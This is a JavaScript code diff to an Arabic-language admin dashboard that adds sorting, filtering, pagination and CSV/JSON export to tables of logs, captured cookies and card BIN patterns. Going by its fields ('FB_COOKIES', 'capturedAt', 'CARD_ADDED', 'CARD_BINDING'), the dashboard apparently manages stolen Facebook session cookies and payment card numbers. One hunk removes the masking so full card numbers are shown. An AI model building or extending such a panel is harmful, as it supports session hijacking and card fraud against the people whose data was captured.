@@ -20,6 +20,287 @@ const APPWRITE_CONFIG = {
 let currentSection = 'overview';
 let isLoggedIn = false;
 
+// ====================================
+// GOOGLE SHEETS TABLE SYSTEM
+// ====================================
+
+// Table state management
+const tableState = {
+    logs: { sortColumn: 'createdAt', sortDirection: 'desc', filters: {}, currentPage: 1, perPage: 50 },
+    cookies: { sortColumn: 'capturedAt', sortDirection: 'desc', filters: {}, currentPage: 1, perPage: 50 },
+    bins: { sortColumn: 'createdAt', sortDirection: 'desc', filters: {}, currentPage: 1, perPage: 50 },
+    users: { sortColumn: 'lastLogin', sortDirection: 'desc', filters: {}, currentPage: 1, perPage: 50 }
+};
+
+// Column definitions for each table
+const tableColumns = {
+    logs: [
+        { key: 'userId', label: 'المستخدم', sortable: true, filterable: true },
+        { key: 'type', label: 'النوع', sortable: true, filterable: true, filterType: 'select', options: ['CARD_ADDED', 'FB_COOKIES', 'BIN_REGISTERED', 'CARD_BINDING'] },
+        { key: 'ip', label: 'IP', sortable: true, filterable: true },
+        { key: 'data', label: 'البيانات', sortable: false, filterable: true },
+        { key: 'createdAt', label: 'التاريخ', sortable: true, filterable: true, filterType: 'date' }
+    ],
+    cookies: [
+        { key: 'userId', label: 'المستخدم', sortable: true, filterable: true },
+        { key: 'ip', label: 'IP', sortable: true, filterable: true },
+        { key: 'url', label: 'URL', sortable: true, filterable: true },
+        { key: 'cookiesLength', label: 'طول الكوكيز', sortable: true, filterable: false },
+        { key: 'capturedAt', label: 'تاريخ الالتقاط', sortable: true, filterable: true, filterType: 'date' }
+    ],
+    bins: [
+        { key: 'userId', label: 'المستخدم', sortable: true, filterable: true },
+        { key: 'pattern', label: 'Pattern', sortable: true, filterable: true },
+        { key: 'name', label: 'الاسم', sortable: true, filterable: true },
+        { key: 'usageCount', label: 'الاستخدام', sortable: true, filterable: false },
+        { key: 'createdAt', label: 'تاريخ الإنشاء', sortable: true, filterable: true, filterType: 'date' }
+    ]
+};
+
+// Sort data by column
+function sortData(data, column, direction) {
+    return [...data].sort((a, b) => {
+        let valA = a[column] || '';
+        let valB = b[column] || '';
+
+        // Handle dates
+        if (column.includes('At') || column.includes('Date') || column.includes('date')) {
+            valA = new Date(valA || 0).getTime();
+            valB = new Date(valB || 0).getTime();
+        }
+        // Handle numbers
+        else if (typeof valA === 'number' || !isNaN(parseFloat(valA))) {
+            valA = parseFloat(valA) || 0;
+            valB = parseFloat(valB) || 0;
+        }
+        // Handle strings
+        else {
+            valA = String(valA).toLowerCase();
+            valB = String(valB).toLowerCase();
+        }
+
+        if (direction === 'asc') {
+            return valA > valB ? 1 : valA < valB ? -1 : 0;
+        } else {
+            return valA < valB ? 1 : valA > valB ? -1 : 0;
+        }
+    });
+}
+
+// Filter data by column filters
+function filterData(data, filters) {
+    if (!filters || Object.keys(filters).length === 0) return data;
+
+    return data.filter(item => {
+        return Object.entries(filters).every(([column, filterValue]) => {
+            if (!filterValue) return true;
+
+            const itemValue = String(item[column] || '').toLowerCase();
+            const searchValue = String(filterValue).toLowerCase();
+
+            // For select filters, exact match
+            if (filterValue.startsWith('exact:')) {
+                return itemValue === filterValue.replace('exact:', '').toLowerCase();
+            }
+
+            // For text filters, partial match
+            return itemValue.includes(searchValue);
+        });
+    });
+}
+
+// Generate pagination HTML with page numbers
+function generatePagination(tableName, totalItems, currentPage, perPage) {
+    const totalPages = Math.ceil(totalItems / perPage);
+    const startItem = (currentPage - 1) * perPage + 1;
+    const endItem = Math.min(currentPage * perPage, totalItems);
+
+    // Generate page numbers
+    let pageNumbers = [];
+    const maxVisiblePages = 7;
+
+    if (totalPages <= maxVisiblePages) {
+        for (let i = 1; i <= totalPages; i++) pageNumbers.push(i);
+    } else {
+        if (currentPage <= 4) {
+            pageNumbers = [1, 2, 3, 4, 5, '...', totalPages];
+        } else if (currentPage >= totalPages - 3) {
+            pageNumbers = [1, '...', totalPages - 4, totalPages - 3, totalPages - 2, totalPages - 1, totalPages];
+        } else {
+            pageNumbers = [1, '...', currentPage - 1, currentPage, currentPage + 1, '...', totalPages];
+        }
+    }
+
+    return `
+        <div class="pagination-container">
+            <div class="pagination-info">
+                <span class="total-count">${totalItems} سجل</span>
+                <span class="page-range">عرض ${startItem} - ${endItem}</span>
+            </div>
+            <div class="pagination-controls">
+                <button class="pagination-btn" onclick="goToPage('${tableName}', 1)" ${currentPage === 1 ? 'disabled' : ''}>«</button>
+                <button class="pagination-btn" onclick="goToPage('${tableName}', ${currentPage - 1})" ${currentPage === 1 ? 'disabled' : ''}>‹</button>
+                ${pageNumbers.map(page =>
+        page === '...'
+            ? '<span class="pagination-ellipsis">...</span>'
+            : `<button class="pagination-btn ${page === currentPage ? 'active' : ''}" onclick="goToPage('${tableName}', ${page})">${page}</button>`
+    ).join('')}
+                <button class="pagination-btn" onclick="goToPage('${tableName}', ${currentPage + 1})" ${currentPage === totalPages ? 'disabled' : ''}>›</button>
+                <button class="pagination-btn" onclick="goToPage('${tableName}', ${totalPages})" ${currentPage === totalPages ? 'disabled' : ''}>»</button>
+            </div>
+            <div class="export-buttons">
+                <select class="per-page-select" onchange="changePerPage('${tableName}', this.value)">
+                    <option value="25" ${perPage === 25 ? 'selected' : ''}>25 لكل صفحة</option>
+                    <option value="50" ${perPage === 50 ? 'selected' : ''}>50 لكل صفحة</option>
+                    <option value="100" ${perPage === 100 ? 'selected' : ''}>100 لكل صفحة</option>
+                    <option value="200" ${perPage === 200 ? 'selected' : ''}>200 لكل صفحة</option>
+                </select>
+                <button class="export-btn" onclick="exportTable('${tableName}', 'csv')">📊 CSV</button>
+                <button class="export-btn" onclick="exportTable('${tableName}', 'json')">📋 JSON</button>
+            </div>
+        </div>
+    `;
+}
+
+// Navigate to page
+function goToPage(tableName, page) {
+    const state = tableState[tableName];
+    const totalPages = Math.ceil((window[`all${tableName.charAt(0).toUpperCase() + tableName.slice(1)}Data`]?.length || 0) / state.perPage);
+
+    if (page < 1) page = 1;
+    if (page > totalPages) page = totalPages;
+
+    state.currentPage = page;
+
+    // Re-render the appropriate table
+    switch (tableName) {
+        case 'logs': renderLogsTable(); break;
+        case 'cookies': renderCookiesTable(); break;
+        case 'bins': renderBinsTable(); break;
+    }
+}
+
+// Change items per page
+function changePerPage(tableName, value) {
+    tableState[tableName].perPage = parseInt(value);
+    tableState[tableName].currentPage = 1;
+    goToPage(tableName, 1);
+}
+
+// Toggle sort column
+function toggleSort(tableName, column) {
+    const state = tableState[tableName];
+
+    if (state.sortColumn === column) {
+        state.sortDirection = state.sortDirection === 'asc' ? 'desc' : 'asc';
+    } else {
+        state.sortColumn = column;
+        state.sortDirection = 'desc';
+    }
+
+    state.currentPage = 1;
+
+    switch (tableName) {
+        case 'logs': renderLogsTable(); break;
+        case 'cookies': renderCookiesTable(); break;
+        case 'bins': renderBinsTable(); break;
+    }
+}
+
+// Update column filter
+function updateFilter(tableName, column, value) {
+    tableState[tableName].filters[column] = value;
+    tableState[tableName].currentPage = 1;
+
+    // Debounce the render
+    clearTimeout(window[`filter_timeout_${tableName}`]);
+    window[`filter_timeout_${tableName}`] = setTimeout(() => {
+        switch (tableName) {
+            case 'logs': renderLogsTable(); break;
+            case 'cookies': renderCookiesTable(); break;
+            case 'bins': renderBinsTable(); break;
+        }
+    }, 300);
+}
+
+// Clear all filters
+function clearFilters(tableName) {
+    tableState[tableName].filters = {};
+    tableState[tableName].currentPage = 1;
+
+    // Clear filter inputs
+    document.querySelectorAll(`#${tableName}-table .column-filter`).forEach(input => {
+        input.value = '';
+    });
+
+    switch (tableName) {
+        case 'logs': renderLogsTable(); break;
+        case 'cookies': renderCookiesTable(); break;
+        case 'bins': renderBinsTable(); break;
+    }
+}
+
+// Export table data
+function exportTable(tableName, format) {
+    let data;
+    switch (tableName) {
+        case 'logs': data = allLogsData; break;
+        case 'cookies': data = allCookiesData; break;
+        case 'bins': data = allBinsData; break;
+        default: return;
+    }
+
+    // Apply current filters
+    const state = tableState[tableName];
+    data = filterData(data, state.filters);
+
+    let content, filename, mimeType;
+
+    if (format === 'csv') {
+        // Generate CSV
+        const columns = tableColumns[tableName];
+        const headers = columns.map(c => c.label).join(',');
+        const rows = data.map(item =>
+            columns.map(c => {
+                let val = item[c.key] || '';
+                if (c.key === 'data' && typeof val === 'object') val = JSON.stringify(val);
+                // Escape quotes and wrap in quotes
+                return `"${String(val).replace(/"/g, '""')}"`;
+            }).join(',')
+        );
+        content = [headers, ...rows].join('\n');
+        // Add BOM for Excel UTF-8 compatibility
+        content = '\ufeff' + content;
+        filename = `${tableName}_export_${new Date().toISOString().split('T')[0]}.csv`;
+        mimeType = 'text/csv;charset=utf-8';
+    } else {
+        // Generate JSON
+        content = JSON.stringify(data, null, 2);
+        filename = `${tableName}_export_${new Date().toISOString().split('T')[0]}.json`;
+        mimeType = 'application/json';
+    }
+
+    // Download file
+    const blob = new Blob([content], { type: mimeType });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = filename;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    URL.revokeObjectURL(url);
+
+    alert(`✅ تم تصدير ${data.length} سجل بنجاح!`);
+}
+
+// Highlight search term in text
+function highlightSearch(text, searchTerm) {
+    if (!searchTerm || !text) return text;
+    const regex = new RegExp(`(${searchTerm.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, 'gi');
+    return String(text).replace(regex, '<span class="search-highlight">$1</span>');
+}
+
 // Helper Functions
 function getAppwriteHeaders() {
     return {
@@ -510,9 +791,22 @@ function updateCookiesStats() {
 
 function renderCookiesTable() {
     const tbody = document.getElementById('cookies-tbody');
+    const paginationContainer = document.getElementById('cookies-pagination-container');
     const searchQuery = (document.getElementById('cookies-search')?.value || '').toLowerCase();
 
-    let filtered = allCookiesData;
+    // Get state
+    const state = tableState.cookies;
+
+    // Add cookiesLength property to data for sorting
+    let filtered = allCookiesData.map(c => ({
+        ...c,
+        cookiesLength: (c.cookies || '').length
+    }));
+
+    // Apply column filters from tableState
+    filtered = filterData(filtered, state.filters);
+
+    // Apply global search
     if (searchQuery) {
         filtered = filtered.filter(c =>
             (c.userId || '').toLowerCase().includes(searchQuery) ||
@@ -520,16 +814,39 @@ function renderCookiesTable() {
         );
     }
 
-    // Sort by date (newest first)
-    filtered.sort((a, b) => new Date(b.capturedAt || b.$createdAt) - new Date(a.capturedAt || a.$createdAt));
+    // Sort using tableState
+    filtered = sortData(filtered, state.sortColumn, state.sortDirection);
+
+    // Update sort indicators in header
+    document.querySelectorAll('#cookies-table th.sortable').forEach(th => {
+        th.classList.remove('sorted-asc', 'sorted-desc');
+        if (th.dataset.column === state.sortColumn) {
+            th.classList.add(state.sortDirection === 'asc' ? 'sorted-asc' : 'sorted-desc');
+        }
+    });
+
+    // Pagination using tableState
+    const totalItems = filtered.length;
+    const totalPages = Math.ceil(totalItems / state.perPage);
+    if (state.currentPage > totalPages && totalPages > 0) state.currentPage = totalPages;
+    if (state.currentPage < 1) state.currentPage = 1;
+
+    const startIndex = (state.currentPage - 1) * state.perPage;
+    const endIndex = startIndex + state.perPage;
+    const paginatedCookies = filtered.slice(startIndex, endIndex);
+
+    // Inject pagination HTML
+    if (paginationContainer) {
+        paginationContainer.innerHTML = generatePagination('cookies', totalItems, state.currentPage, state.perPage);
+    }
 
     if (filtered.length === 0) {
         tbody.innerHTML = '<tr><td colspan="6" class="loading">لا توجد Cookies مطابقة</td></tr>';
         return;
     }
 
-    tbody.innerHTML = filtered.map(cookie => {
-        const cookiesLength = (cookie.cookies || '').length;
+    tbody.innerHTML = paginatedCookies.map(cookie => {
+        const cookiesLength = cookie.cookiesLength;
         const cookiesPreview = cookiesLength > 0 ? `${cookiesLength} حرف` : 'فارغ';
 
         return `
@@ -668,25 +985,26 @@ function matchCardPattern(cardNumber, searchPattern) {
     return false;
 }
 
-// Pagination state
+// Pagination state (legacy - now using tableState)
 let currentLogsPage = 1;
 let logsPerPage = 50;
 
 function renderLogsTable() {
     const tbody = document.getElementById('logs-tbody');
+    const paginationContainer = document.getElementById('logs-pagination-container');
     const cardSearch = (document.getElementById('card-search')?.value || '').trim();
-    const typeFilter = document.getElementById('log-type-filter')?.value || '';
     const searchResultsInfo = document.getElementById('search-results-info');
     const searchResultsText = document.getElementById('search-results-text');
 
+    // Get state
+    const state = tableState.logs;
+
     let filteredLogs = [...allLogsData];
 
-    // Filter by type
-    if (typeFilter) {
-        filteredLogs = filteredLogs.filter(log => log.type === typeFilter);
-    }
+    // Apply column filters from tableState
+    filteredLogs = filterData(filteredLogs, state.filters);
 
-    // Filter by card number pattern
+    // Filter by card number pattern (global search)
     if (cardSearch) {
         filteredLogs = filteredLogs.filter(log => {
             try {
@@ -707,34 +1025,31 @@ function renderLogsTable() {
         if (searchResultsInfo) searchResultsInfo.style.display = 'none';
     }
 
-    // Sort by date (newest first)
-    filteredLogs.sort((a, b) => new Date(b.createdAt || b.$createdAt) - new Date(a.createdAt || a.$createdAt));
+    // Sort using tableState
+    filteredLogs = sortData(filteredLogs, state.sortColumn, state.sortDirection);
 
-    // Update total count
-    const logsCount = document.getElementById('logs-count');
-    if (logsCount) {
-        logsCount.textContent = `${filteredLogs.length} سجل`;
-    }
+    // Update sort indicators in header
+    document.querySelectorAll('#logs-table th.sortable').forEach(th => {
+        th.classList.remove('sorted-asc', 'sorted-desc');
+        if (th.dataset.column === state.sortColumn) {
+            th.classList.add(state.sortDirection === 'asc' ? 'sorted-asc' : 'sorted-desc');
+        }
+    });
 
-    // Pagination
-    const totalPages = Math.ceil(filteredLogs.length / logsPerPage);
-    if (currentLogsPage > totalPages) currentLogsPage = 1;
+    // Pagination using tableState
+    const totalItems = filteredLogs.length;
+    const totalPages = Math.ceil(totalItems / state.perPage);
+    if (state.currentPage > totalPages && totalPages > 0) state.currentPage = totalPages;
+    if (state.currentPage < 1) state.currentPage = 1;
 
-    const startIndex = (currentLogsPage - 1) * logsPerPage;
-    const endIndex = startIndex + logsPerPage;
+    const startIndex = (state.currentPage - 1) * state.perPage;
+    const endIndex = startIndex + state.perPage;
     const paginatedLogs = filteredLogs.slice(startIndex, endIndex);
 
-    // Update pagination info
-    const pageInfo = document.getElementById('logs-page-info');
-    if (pageInfo) {
-        pageInfo.textContent = `صفحة ${currentLogsPage} من ${totalPages || 1}`;
+    // Inject pagination HTML
+    if (paginationContainer) {
+        paginationContainer.innerHTML = generatePagination('logs', totalItems, state.currentPage, state.perPage);
     }
-
-    // Update pagination buttons
-    const prevBtn = document.getElementById('logs-prev');
-    const nextBtn = document.getElementById('logs-next');
-    if (prevBtn) prevBtn.disabled = currentLogsPage <= 1;
-    if (nextBtn) nextBtn.disabled = currentLogsPage >= totalPages;
 
     if (filteredLogs.length === 0) {
         tbody.innerHTML = '<tr><td colspan="5" class="loading">لا توجد سجلات مطابقة</td></tr>';
@@ -754,7 +1069,6 @@ function renderLogsTable() {
 
         if (log.type === 'CARD_ADDED') {
             const cardNum = parsedData.number || '';
-            const maskedCard = cardNum ? `****${cardNum.slice(-4)}` : '-';
             displayData = `
                 <div style="font-family: monospace; font-size: 12px;">
                     <div><strong style="color:#00FF41;">💳</strong> <span style="color:#FFD700;">${cardNum || '-'}</span></div>
@@ -791,11 +1105,11 @@ function renderLogsTable() {
             displayData = `<div style="max-width:300px;overflow:hidden;text-overflow:ellipsis;">${log.data || '-'}</div>`;
         }
 
-        // Apply card search highlight
+        // Apply search highlight
         if (cardSearch) {
             const cardNumber = parsedData.number || parsedData.cardNumber || parsedData.bin || '';
             if (cardNumber) {
-                displayData = displayData.replace(cardNumber, `<span style="background: #FFD700; color: #1a1a2e; padding: 2px 4px; border-radius: 4px;">${cardNumber}</span>`);
+                displayData = displayData.replace(cardNumber, `<span class="search-highlight">${cardNumber}</span>`);
             }
         }
 
